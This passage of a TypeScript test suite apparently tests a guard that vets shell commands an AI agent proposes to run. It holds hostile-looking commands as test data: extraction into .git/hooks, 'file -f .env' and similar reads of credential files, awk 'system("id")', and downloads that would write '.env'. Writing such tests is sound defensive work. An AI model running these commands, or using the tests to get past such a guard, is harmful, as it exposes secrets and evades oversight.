    const names = (word: string, cwd: string) => g.expandNames(word, cwd)?.map((p: string) => p.replace(/\/+/g, "/"));
    assert.deepEqual(names("mylin?/x", dir), [`${dir}/mylink/x`]);
    assert.deepEqual(names("myl*", dir), [`${dir}/mylink`]);
    assert.deepEqual(names("nosuch*", dir), []);
    assert.deepEqual(names("{mylink,f}/x", dir), [`${dir}/mylink/x`, `${dir}/f/x`]);
    assert.deepEqual(g.expandNames("/proc/self/cw[d]", "/")?.map((p: string) => p.replace(/\/+/g, "/")), ["/proc/self/cwd"]);
    // expandWord is the same, each name walked: the plugin's own directory for that last one.
    assert.deepEqual(expandWord("/proc/self/cw[d]", "/"), [process.cwd()]);
  });

  test("r4 B7-10: cdTo reads CDPATH only for a logical cd, and only where the shell has it", () => {
    const from = g.startPlace(dir);
    const was = process.env.CDPATH;
    process.env.CDPATH = `.:${os.homedir()}`;
    try {
      const real = fs.realpathSync(`${dir}/src`);
      // Not told what the shell keeps: it is taken to inherit the plugin's CDPATH.
      g.shellKeeps(undefined);
      assert.equal(g.cdTo(from, "src"), undefined);
      // A plain chdir (`git -C`) never reads it, whatever the shell has.
      assert.equal(g.cdTo(from, "src", true)?.real, real);
      // `./x`, `../x` and `/x` are never looked up in it.
      assert.equal(g.cdTo(from, "./src")?.real, real);
      assert.equal(g.cdTo(from, `${dir}/src`)?.real, real);
      // The shell hook took bash's own variables out, and the user keeps none: followed.
      g.shellKeeps([]);
      assert.equal(g.cdTo(from, "src")?.real, real);
      g.shellKeeps(["PS4", "BASH_ENV"]);
      assert.equal(g.cdTo(from, "src")?.real, real);
      // The user keeps CDPATH: the shell has it.
      g.shellKeeps(["CDPATH"]);
      assert.equal(g.cdTo(from, "src"), undefined);
      assert.equal(g.cdTo(from, "src", true)?.real, real);
      // `cd -P src` is a lookup in CDPATH too: outside the shape then; `cd -P ./src` is not.
      assert.equal(g.located("cd -P src && ls", dir).unfollowed, g.UNFOLLOWED);
      assert.equal(g.located("cd -P ./src && ls", dir).unfollowed, undefined);
      g.shellKeeps([]);
      assert.equal(g.located("cd -P src && ls", dir).unfollowed, undefined);
      // An empty CDPATH is none.
      g.shellKeeps(["CDPATH"]);
      process.env.CDPATH = "";
      assert.equal(g.cdTo(from, "src")?.real, real);
    } finally {
      if (was === undefined) delete process.env.CDPATH;
      else process.env.CDPATH = was;
      g.shellKeeps(undefined);
    }
  });

  test("r4 B7-7: the places a program writes because an option names them", () => {
    const named = (command: string) => writesOf(parse(command).cmds).writes.map((w) => `${w.word}${w.dir ? "/" : ""}`);
    assert.deepEqual(named("tar -xf a.tar -C .git/hooks"), [".git/hooks/"]);
    assert.deepEqual(named("tar xfC a.tar .git/hooks"), [".git/hooks/"]);
    assert.deepEqual(named("tar -xf a.tar --directory=out"), ["out/"]);
    // Listing or making an archive writes nothing there.
    assert.deepEqual(named("tar -tf a.tar -C .git/hooks"), []);
    assert.deepEqual(named("tar -cf a.tar -C src ."), []);
    assert.deepEqual(named("unzip a.zip -d .git/hooks"), [".git/hooks/"]);
    assert.deepEqual(named("unzip -l a.zip -d out"), []);
    assert.deepEqual(named("find . -maxdepth 0 -fprint0 .git/hooks/x"), [".git/hooks/x"]);
    assert.deepEqual(named("find . -fprint out.txt -fls ls.txt"), ["out.txt", "ls.txt"]);
    assert.deepEqual(named("rsync -a --log-file=l.txt --write-batch=b --only-write-batch=c --backup-dir=bk --temp-dir=t --partial-dir=p -T t2 src/ dst/").sort(), ["b", "bk/", "c", "dst/", "l.txt", "p/", "t/", "t2/"].sort());
    // A place known only when the command runs is not listed (the unnamed write marks the project).
    assert.deepEqual(named("tar -xf a.tar -C \"$d\""), []);
  });
  test("r4 B7-11: a move is a write of unnamed files unless every source is known to be a file", () => {
    const unknown = (command: string, filesOnly?: (sources: string[]) => boolean) => writesOf(parse(command).cmds, filesOnly).unknown;
    assert.match(unknown("mv a b") ?? "", /mv writes the files of directories/);
    assert.match(unknown("mv a b", () => false) ?? "", /mv writes the files of directories/);
    assert.equal(unknown("mv a b", () => true), undefined);
    assert.equal(unknown("mv -t d a b", (sources) => sources.join(" ") === "a b"), undefined);
    assert.equal(unknown("mv a b d", (sources) => sources.join(" ") === "a b"), undefined);
    // A recursive copy stays one, whatever its sources are.
    assert.match(unknown("cp -r a b", () => true) ?? "", /cp writes the files of directories/);
  });
  test("r4 B7-8: a fetch destination without refs/, as git reads it", () => {
    for (const [dst, ref] of [["main", "refs/heads/main"], ["heads/x", "refs/heads/x"], ["tags/v9", "refs/tags/v9"], ["remotes/origin/x", "refs/remotes/origin/x"], ["refs/stash", "refs/stash"], ["a/b", "refs/heads/a/b"], ["", ""]])
      assert.equal(g.fetchDestination(dst), ref, dst);
    for (const c of ["git fetch . main:tags/v9", "git fetch origin a:remotes/x", "git fetch origin a:refs/remotes/x", "git fetch origin a:refs/tags/b", "git fetch --filter=blob:none origin", "git fetch --filter tree:0"]) assert.ok(gitProblem(c), c);
    for (const c of ["git fetch . main:heads/v9", "git fetch origin a:remotes/origin/a", "git fetch origin a:b", "git fetch --prune origin a:remotes/origin/a", "git fetch origin a:refs/remotes/origin/a"]) assert.equal(gitProblem(c), undefined, c);
  });

  // The post-write check, with a context of its own.
  const verdictOf = (command: string, ctx: Record<string, unknown> = {}) => {
    const cmds = parse(command).cmds;
    return g.argvGuards(cmds, { cwd: dir, cwdKnown: true, scope: makeScope(dir, []), written: () => new Set([`${dir}/note.txt`]), resolve: (word: string) => path.resolve(dir, word), cwdOf: () => dir, inProject: (p: string) => p.startsWith(dir), ...ctx });
  };
  test("r4 B7-3: after a write, a program on the safe list is not judged, and any other is", () => {
    for (const c of ["ls", "for f in a b", "done", "fi", "sleep 1", "sed -i s/a/b/ f", "awk '{print $1}' f", "jq . f", "curl -s https://h.invalid/x", "tar -tf a.tar", "wait", "bash -c true", "env ls", "git rev-parse HEAD", "git branch", "git cat-file -p HEAD:f", "git ls-files -s", "git push", "git clean -n", "git clean -ndx", "git clean --dry-run", "ping -c1 localhost", "dig example.com", "ss -ltn"])
      assert.equal(verdictOf(c), undefined, c);
    for (const c of ["make", "tsc --noEmit", "node --version", "./x.sh", "bash x.sh", "source x.sh", ". x.sh", "python3 x.py", "function g", "coproc make", "jq -f p.jq f", "jq 'import \"m\" as m; .' f", "zip -T -TT 'cmd' a.zip", "git pull", "git frob", "git clean -fd", "git submodule status", "man ls", "docker ps", "unknown-tool", "env make", "timeout 5 make"])
      assert.match(verdictOf(c)?.reason ?? "", /after this session wrote note\.txt/, c);
    // (sed and awk with a script from a file are the model's by their own check, written or not.)
    for (const c of ["sed -f s.sed f", "awk -f p.awk f", "sed 1e f", "awk 'BEGIN { system(\"id\") }'"]) assert.equal(verdictOf(c)?.action, "classify", c);
  });
  test("r4 B7-3: git's readers are safe only where the configuration check says so", () => {
    const asked: [string, boolean][] = [];
    const ctx = (answer: boolean) => ({ gitFiltersAbsent: (_: unknown, args: string[], diff = false) => (asked.push([args.join(" "), diff]), answer) });
    for (const c of ["git status", "git add f", "git commit -m x", "git checkout main", "git stash", "git stash pop", "git stash push -m x"]) {
      assert.equal(verdictOf(c, ctx(true)), undefined, c);
      assert.equal(asked.pop()?.[1], false, c);
      assert.match(verdictOf(c, ctx(false))?.reason ?? "", /after this session wrote/, c);
      assert.match(verdictOf(c)?.reason ?? "", /after this session wrote/, `${c}, with no check to ask`);
    }
    for (const c of ["git diff", "git log -3", "git show HEAD", "git blame f", "git stash list", "git stash show", "git describe", "git shortlog -s", "git cat-file --textconv HEAD:f", "git cat-file --filters HEAD:f"]) {
      assert.equal(verdictOf(c, ctx(true)), undefined, c);
      assert.equal(asked.pop()?.[1], true, c);
      assert.match(verdictOf(c, ctx(false))?.reason ?? "", /after this session wrote/, c);
    }
    // `ls-files -m` compares the work tree through the clean filter.
    for (const c of ["git ls-files -m", "git ls-files --modified", "git ls-files -dm", "git ls-files --eol"]) {
      assert.equal(verdictOf(c, ctx(true)), undefined, c);
      assert.equal(asked.pop()?.[1], false, c);
      assert.match(verdictOf(c, ctx(false))?.reason ?? "", /after this session wrote/, c);
    }
    // What is not on the list stays off it whatever the configuration says.
    for (const c of ["git pull", "git merge x", "git rebase x", "git cherry-pick x", "git submodule status", "git grep x", "git clean -fd"]) assert.match(verdictOf(c, ctx(true))?.reason ?? "", /after this session wrote/, c);
  });
  test("r4 B7-2: the writes of the call's other commands count, the command's own do not", () => {
    const mine = new Set([`${dir}/own.txt`]);
    const none = { written: new Set<string>(), unlisted: [] as string[] };
    const cmds = parse("make > own.txt").cmds;
    const ctx = { cwd: dir, cwdKnown: true, scope: makeScope(dir, []), written: () => mine, resolve: (word: string) => path.resolve(dir, word), cwdOf: () => dir, inProject: (p: string) => p.startsWith(dir) };
    assert.match(g.argvGuards(cmds, ctx)?.reason ?? "", /after this session wrote own\.txt/);
    assert.equal(g.argvGuards(cmds, { ...ctx, others: () => none }), undefined);
    assert.match(g.argvGuards(cmds, { ...ctx, others: () => ({ written: new Set([`${dir}/src/x`]), unlisted: [] }) })?.reason ?? "", /after this session wrote src\/x/);
    assert.match(g.argvGuards(cmds, { ...ctx, others: () => ({ written: new Set(), unlisted: [dir] }) })?.reason ?? "", /wrote files the check cannot list/);
  });
  test("r4 B7-2: a program run by a path counts where it lives; a pattern of a case is no program", () => {
    const at = (cwd: string, written: string) => ({ cwdOf: () => cwd, resolve: (word: string) => path.resolve(cwd, word), written: () => new Set([written]) });
    // It runs in src and lives in tools: a write in tools reaches it, one in docs does not.
    assert.match(verdictOf("../tools/check.sh", at(`${dir}/src`, `${dir}/tools/lib.sh`))?.reason ?? "", /after this session wrote/);
    assert.equal(verdictOf("../tools/check.sh", at(`${dir}/src`, `${dir}/docs/x.md`)), undefined);
    const star = parse("*").cmds[0];
    const ctx = { cwd: dir, cwdKnown: true, scope: makeScope(dir, []), written: () => new Set([`${dir}/note.txt`]), resolve: (word: string) => path.resolve(dir, word), cwdOf: () => dir };
    assert.match(g.argvGuard(star, ctx)?.reason ?? "", /after this session wrote/);
    assert.equal(g.argvGuard(star, { ...ctx, pattern: () => true }), undefined);
  });
  test("r4 B7-2: the change time of a runner's file operand, and of nothing that is no file", () => {
    const old = fs.statSync(`${dir}/f`, { bigint: true }).ctimeNs;
    const ctx = (began: bigint | ((file: string, dev: bigint) => bigint)) => ({ began, written: () => new Set<string>() });
    for (const c of ["pytest f", "go run f", "jest f", "bun test f", "bun run f", "bun build f"]) {
      assert.match(verdictOf(c, ctx(old))?.reason ?? "", /runs f, changed since this session began/, c);
      assert.equal(verdictOf(c, ctx(old + 1n)), undefined, c);
    }
    // No file of that name, or a directory: nothing to judge (and `bun test` reads no file `test`).
    for (const c of ["pytest -k name", "pytest nosuch", "go test ./...", "pytest src", "bun test", "bun run build"]) assert.equal(verdictOf(c, ctx(0n)), undefined, c);
    // The clock is asked for the file's own file system.
    const seen: [string, bigint][] = [];
    verdictOf("pytest f", ctx((file, dev) => (seen.push([file, dev]), old + 1n)));
    assert.deepEqual(seen, [[`${dir}/f`, fs.statSync(`${dir}/f`, { bigint: true }).dev]]);
  });
  test("r4 B7-5: the options that read a list, as each program reads its words", () => {
    const reads = (command: string) => {
      const v = verdictOf(command, { written: () => new Set<string>(), dirsOf: () => [dir] });
      return v?.action === "ask" && /reads \S+ as a list/.test(v.reason);
    };
    for (const c of ["file -f .env", "file -f.env", "file -bf .env", "file --files-from=.env", "file --files-fr .env", "file -m .env f", "file -m f:.env x", "file --magic-file .env f", "file --mag=.env f", "jq -f .env", "jq --from-file .env", "find . -files0-from .env", "grep -f .env f", "egrep -f .env f", "fgrep -f.env f", "grep --exclude-from=.env x f", "rg -f .env", "rg --ignore-file .env x", "rg --ignore-file=.env x", "du -X .env", "du --exclude-from .env", "du --files0-from=.env", "wc --files0-from=.env", "sort --files0-from=.env", "tar -cf - -T .env", "tar cfT - .env", "tar -cf - -X.env src", "file -f .e*", "file -f .[e]nv", "file -f .{env,x}", "file -f ./src/../.env", "file -f gitlink/../.env"])
      assert.equal(reads(c), true, c);
    for (const c of ["file -f f", "du --exclude=.env .", "grep --exclude=.env -r x .", "grep --files-with-matches x .env.example", "rg --ignore x", "sort -f f", "file -- -f .env", "jq . f", "find . -name .env", "tar -cf - --exclude=.env src"])
      assert.equal(reads(c), false, c);
    // Where the command runs is not known: a credential's name asks, any other goes to the model.
    const unplaced = (command: string) => verdictOf(command, { written: () => new Set<string>(), dirsOf: () => undefined, cwdOf: () => undefined })?.action;
    assert.equal(unplaced("file -f zzz"), "classify");
    assert.equal(unplaced("file -f .env"), "ask");
    assert.equal(unplaced("file -f .aws/credentials"), "ask");
    assert.equal(unplaced("file -f /etc/hostname"), undefined);
    // Each directory it may run in is judged (`src/list` is a link to the decoy; there is no `list` above).
    fs.symlinkSync("../.env", `${dir}/src/list`);
    assert.equal(verdictOf("file -f list", { written: () => new Set<string>(), dirsOf: () => [dir, `${dir}/src`] })?.action, "ask");
    assert.equal(verdictOf("file -f list", { written: () => new Set<string>(), dirsOf: () => [dir] })?.action, undefined);
    // `file -m a:b` is two files.
    assert.match(verdictOf("file -m f:src/list x", { written: () => new Set<string>(), dirsOf: () => [dir] })?.reason ?? "", /file reads src\/list as a list: cat reads a credential file/);
    assert.equal(verdictOf("file -m f:src/main.c x", { written: () => new Set<string>(), dirsOf: () => [dir] })?.action, undefined);
    // A list through /proc/self is the model's; another process's directory too.
    for (const c of ["file -f mylink/x", "wc --files0-from=/proc/1/cwd/x", "file -f /proc/self/cwd/.env"]) assert.equal(verdictOf(c, { written: () => new Set<string>(), dirsOf: () => [dir] })?.action, "classify", c);
  });
  test("r4 B7-6: the names a download writes", () => {
    const names = (command: string) => writesOf(parse(command).cmds).writes.filter((w) => !w.dir).map((w) => w.word);
    for (const url of ["http://h/.env/", "http://h/.env/.", "http://h/.env/./", "http://h/.env/?x=1", "http://h/.env/#f", "http://h/.env/%2e", "http://h/.env/x/../", "http://h/x/.env/", "http://h/.env//", "http://h/.env\\", "http://h/\\.env", "http://h/a\\.env", "h/.env/", "http://h/%2eenv", "http://h/.env"])
      assert.ok(names(`curl -sO '${url}'`).includes(".env"), url);
    for (const url of ["http://h/x/", "http://h/", "http://h", "http://h/a?b=.env", "http://h/.env/x", "http://h/.envx/"]) assert.ok(!names(`curl -sO '${url}'`).includes(".env"), url);
    assert.ok(names("curl -s --output-dir out -O http://h/.env/").includes("out/.env"));
    assert.ok(names("wget -q http://h/.env").includes(".env"));
    assert.ok(names("wget -q -P out http://h/a/x.tgz").includes("out/x.tgz"));
    assert.deepEqual(names("wget -q -P out -O x.tgz http://h/a/y.tgz"), ["x.tgz"]);
    // What the tools were seen to write (xcheck/b7/real): curl's name for a path that names
    // nothing, wget's for one that ends in `/`, and wget's with a backslash or a query in it.
    assert.deepEqual(names("curl -sO http://h/"), ["curl_response"]);
    assert.ok(!names("curl -sO http://h/x").includes("curl_response"));
    assert.ok(names("wget -q http://h/x/").includes("index.html"));
    assert.ok(names("wget -q 'http://h/x/?a=1'").includes("index.html?a=1"));
    assert.ok(names("wget -q 'http://h/a\\.env'").includes("a\\.env"));
    assert.ok(names("wget -q 'http://h/a?b=.env'").includes("a?b=.env"));
    assert.ok(!names("wget -q http://h/x.tgz").includes("index.html"));
    // B4: --output-dir joins an absolute -o too; a percent-encoded name is also its decoded one.
    assert.deepEqual(names("curl -s --output-dir out -o /abs/x http://h/y"), ["out//abs/x"]);
    assert.ok(names("wget -q http://h/%2eenv").includes(".env"));
  });
  test("r4 B7-12: the outputs the second part added to the list of writes", () => {
    const unchecked = (command: string) => writesOf(parse(command).cmds).writes.filter((w) => !w.checked).map((w) => w.word);
    for (const c of ["patch -r rej.txt f x.diff", "patch --reject-file=rej.txt f x.diff", "patch -rrej.txt f x.diff", "g++ -o rej.txt x.cc", "c++ -orej.txt x.cc", "clang++ --output=rej.txt x.cc"]) assert.deepEqual(unchecked(c), ["rej.txt"], c);
    // A directory moved: its destination holds files nobody listed.
    assert.deepEqual(writesOf(parse("mv olddir scripts").cmds).unlisted.map((u) => u.dirs), [["scripts"]]);
  });
});
